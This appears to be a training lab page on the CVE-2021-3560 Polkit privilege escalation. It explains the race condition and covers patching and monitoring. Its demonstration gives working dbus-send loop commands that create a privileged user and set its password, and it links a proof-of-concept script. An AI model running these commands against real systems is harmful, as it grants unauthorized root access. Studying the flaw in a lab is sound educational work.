---
title: "Polkit Privilege Escalation"
teaching: 20
exercises: 40
questions:
- "What is Polkit?"
- "How the Exploit Works"
objectives:
- "Understand the Role and Function of Polkit"
- "Identify the Vulnerability"
- "Recognize the Exploitation Process"
---


## What is Polkit?

Polkit is integral to numerous Linux distributions for managing system-wide permissions. The CVE-2021-3560 vulnerability exploits Polkit's functionality, enabling local users to escalate their privileges and achieve root access. This unauthorized elevation can lead to complete system control, enabling attackers to perform further malicious activities. The root cause of this vulnerability lies in a defect within Polkit’s authentication mechanism, which allows the bypassing of the authentication step needed for root access acquisition. Mitigation of this security flaw involves updating the operating system and ensuring that the Polkit version is updated beyond 0.118.

Originally known as PolicyKit, Polkit serves as an intermediary allowing various applications to communicate and execute processes via D-bus, a middleware that facilitates inter-process communication. It enables both privileged (sudo) and non-privileged processes to interact, providing a unified control interface for managing system-wide permissions. For instance, executing the ‘pkexec’ command in a Linux terminal typically triggers a graphical interface prompt for sudo authentication. Conversely, operating Polkit via command-line interfaces permits direct interaction without a graphical user interface.

## Details on How the Exploit Works

The attack is executed through the transmission of a sequence of meticulously constructed D-bus messages directed at Polkit, aimed at inducing a race condition. This condition erroneously issues an authorization message, circumventing the standard authentication procedure. Additionally, the assault leverages the XDG_RUNTIME_DIR environment variable, which delineates the location where Polkit archives its authentication-specific files and tokens. Unauthorized entry into this directory facilitates access to the system without authentication. The success of this exploit significantly depends on timing; therefore, multiple attempts and a rapid succession of requests are essential to increase the likelihood of a successful breach.

## What are the countermeasures?

1. Update and Patch Systems: Regularly update the operating system and all associated packages to ensure that the Polkit component is beyond the vulnerable versions. Specifically, ensure Polkit is updated to version 0.118 or higher, which addresses this specific vulnerability.

2. Monitor System Activity: Implement comprehensive monitoring of system activities, particularly focusing on authentication processes and system privilege escalations. Use intrusion detection systems (IDS) and log management solutions to detect and alert on unusual activities that could indicate an attempted exploitation of the Polkit vulnerability.

3. Restrict Access to Sensitive Directories: Limit access to critical system directories and environment variables, such as XDG_RUNTIME_DIR, which are known to be leveraged in the CVE-2021-3560 exploit. Employ filesystem permissions and access control lists (ACLs) to restrict unauthorized users from accessing or modifying these directories and files.

### Demonstration
1. We will start by first adding the Polkit Privilege Escalation application:

![polkit escalation](https://github.com/markyu0401/CVE-2021-3560-Polkit-Privilege-Escalation/assets/60618569/389a5c69-5b79-469e-b7a3-f8d47bf03668)

2. Next, click the View link to go to the application-specific page and start the application containers:

![polkit start up](https://github.com/markyu0401/CVE-2021-3560-Polkit-Privilege-Escalation/assets/60618569/54d40152-45ce-4b80-82da-7002f7f5db04)

3. Open the terminal and type start with start.sh to remove stale PID file /var/run/dbus/pid. and startsystem message bus dbus.

![start_sh](https://github.com/markyu0401/CVE-2021-3560-Polkit-Privilege-Escalation/assets/60618569/c1dc0b65-67d1-4447-91d7-6e3273e9dc60)\

4. Copy these code in to the terminal, this step finds the time it takes a command to finish. Ensure that the outputted times are written
down.:

   ```
   time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:samurai string:"Samurai" int32:1
   ```
![find_time](https://github.com/markyu0401/CVE-2021-3560-Polkit-Privilege-Escalation/assets/60618569/0a5f41af-9620-4767-bd1f-51fe6b4b593c)

taking in account the “real” time, half it to get the half time it takes to run the dbus query. The
reason for halving is because we want the process to be interrupted in the middle (when the process is still
being worked on at the server level). In the command ensure to change the X.XXX time to half of the
“real” time. You may need to run the command a couple of times as it may not work the first time. The
following is the template command:

5. Create a User with Sudo Privileges: Replace X.XXX with half of the 'real' time above because we want the process to be interrupted in the middle the command will run as a loop of 10000 times You may need to run this step several times.
```
for counter in {1..10000}; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:samurai string:"Samurai" int32:1 & sleep X.XXXs; kill $!;done
```
6. Check User creation ``id samurai`` It should show samurai user exists and show his permissions. Run the step 4 and 5 again if not.

![success!](https://github.com/markyu0401/CVE-2021-3560-Polkit-Privilege-Escalation/assets/60618569/865b55a7-5302-4bc0-aae9-c839b160230f)

7. Then we need to create a hashed password, in this case, “iamsamurai”. Use the following command to do
that:
``openssl passwd -5 iamsamurai``

During the demo, it gave the following hash:``$5$.ulBb4qpmdG5agJY$ucd6GEdfOVOiCojGnCaFNJL1YIjaQRB/TxkbDKyqPw3``

8. The next step is to replace the password hash with the newly generated hash. Ensure to change the hash
string with your given hash and to change the X.XXX with the same half-time as before. Also take the
UID of the account samurai and change the UUUU part of the command:

```
for counter in {1..10000}; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/UserUUUU org.freedesktop.Accounts.User.SetPassword string:'Password Hash' string:GoldenEye & sleep X.XXXs; kill $!;done
```
9. Switch to new user with the password you created in step 7 `su - samurai`

![success2](https://github.com/markyu0401/CVE-2021-3560-Polkit-Privilege-Escalation/assets/60618569/87bc2ed6-e19c-4884-b23f-6684b79ec831)

## Alternative Workout Shell Script
[https://github.com/markyu0401/CVE-2021-3560-Polkit-Privilege-Escalation/blob/main/poc.sh](https://github.com/markyu0401/CVE-2021-3560-Polkit-Privilege-Escalation/blob/main/poc.sh)https://github.com/markyu0401/CVE-2021-3560-Polkit-Privilege-Escalation/blob/main/poc.sh

The poc.sh is the modified version of an existing approach to this lab. Either navigate to the
file and edit the file’s field for username and password or when you call the file, use the command below.
Those will be used to log into the newly created user. Then simply execute the file. Then simply execute
the shell script, it’ll let you know if it ran successfully. Then su into the newly created user!
Use start.sh first then `./poc.sh -u=samurai -p=samurai`

This alternative script was offered to help, due to the nature of the docker compartmentalized
environment. With the nature of this exploit being heavily timing based and non-deterministic, the code
supplied can determine the time intervals at a higher level allowing it to have a much higher degree of
success. The code runs the same lines of code in the primary approach however it is more of an automated
process that should only need to be run less than five times.

![poc_success](https://github.com/markyu0401/CVE-2021-3560-Polkit-Privilege-Escalation/assets/60618569/15fe4eed-eea7-46d1-ab42-70c04999f5dc)

## Mitigation, Patches, and Countermeasures
The most effective strategy for addressing this vulnerability involves installing available updates and patches for the exploit, as well as ensuring the system is up-to-date, particularly ensuring that the Polkit version is beyond 0.118. It is also crucial for system administrators to keep an eye on system logs for any abnormal activities that may suggest a breach or an ongoing attack. The vulnerability has been resolved in the latest versions of certain operating systems, such as Ubuntu 20.04. To verify the security patch, initiate a new Docker container using the most recent version of Ubuntu and attempt to execute the attack.

## Final Notes
The code found in the poc.sh file was originally made by SecNigma, and posted to a public repository on
Github. The link to his Github can be found here:
https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
